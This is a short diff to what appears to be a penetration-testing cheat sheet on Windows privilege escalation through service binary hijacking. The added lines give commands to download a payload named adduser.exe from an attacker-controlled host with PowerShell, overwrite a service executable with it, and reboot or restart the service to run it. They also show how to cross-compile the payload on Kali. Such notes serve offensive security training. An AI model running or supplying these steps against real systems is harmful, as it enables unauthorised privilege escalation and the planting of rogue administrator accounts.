@@ -159,7 +159,26 @@ int main ()
   
   return 0;
 }
+```
+Upload on the target:
+```
+iwr -uri http://$IpAttacker/adduser.exe -outfile adduser.exe
+```
+Overwrite a service binary:
+```
+move c:\path\to\binary\someservice.exe adduser.exe
+```
+and restart the computer (with Privilege __SeShutdownPrivilege__, check with `whoami /priv`):
+```
+shutdown /r /t 0
+```
+or restart the service if possible (usually takes admin rights...):
+```
+net stop someservice.exe
+```
 
+Compilation on Kali (see cross-compiling.md):
+```
 x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
 ```
 
